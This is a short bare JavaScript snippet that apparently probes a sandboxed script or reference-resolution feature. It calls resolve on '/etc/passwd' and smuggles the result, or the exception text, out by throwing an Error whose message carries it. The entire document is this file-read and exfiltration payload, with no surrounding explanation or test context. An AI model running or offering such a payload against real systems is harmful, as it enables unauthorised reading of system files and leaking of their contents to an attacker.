var out={};
try { out.v = String(resolve("/etc/passwd", "/definitions")); } catch(e){ out.v = "EXC:"+String(e).slice(0,100); }
throw new Error("R7::" + JSON.stringify(out));
